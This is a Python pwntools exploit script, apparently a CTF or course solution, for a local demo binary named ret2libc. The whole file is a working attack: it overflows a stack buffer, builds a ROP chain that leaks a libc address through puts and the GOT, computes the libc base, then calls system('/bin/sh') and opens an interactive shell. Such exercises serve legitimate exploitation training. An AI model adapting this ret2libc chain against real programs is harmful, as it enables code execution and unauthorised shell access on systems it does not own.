#!/usr/bin/python3

from pwn import *

l = ELF('/lib/x86_64-linux-gnu/libc-2.27.so') #load in the lib

y = process('/home/cuteleo/workspace/pwn/ntu_ctf_demo/basic/ret2libc/ret2libc')

bss = 0x6b6000
pop_rdi = 0x0000000000400733
pop_rsi_r15 = 0x0000000000400731
ret = 0x400506

gets_plt = 0x400530
puts_plt = 0x400520

libc_start_main_got = 0x600ff0

main = 0x400698

p = flat(
        'a' * 0x38,
        pop_rdi,
        libc_start_main_got,
        puts_plt,
        main
)

y.sendlineafter(':D',p)

y.recvline()
l.address = u64( y.recv(6) + '\0\0' ) - 0x21ab0
success( 'libc -> %s' , hex( l.address ))

p = flat(
        'a' * 0x38,
        ret,
        pop_rdi,
        l.search( '/bin/sh' ).next(),
        l.sym.system
)

y.sendlineafter(':D',p)

y.interactive()
